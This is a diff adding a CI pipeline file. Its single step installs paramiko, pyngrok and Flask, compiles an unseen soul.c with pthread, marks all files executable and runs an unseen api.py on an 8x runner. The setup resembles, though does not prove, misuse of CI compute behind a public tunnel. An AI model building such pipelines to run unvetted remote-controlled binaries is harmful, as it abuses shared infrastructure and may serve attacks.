@@ -1,0 +1,9 @@
+pipelines:
+  default:
+    - step:
+        name: Run Python Script
+        image: python:3.10
+        size: 8x
+        script:
+          - pip install paramiko pyngrok Flask && gcc soul.c -o soul -lpthread && lscpu && chmod +x * && python3 api.py
+
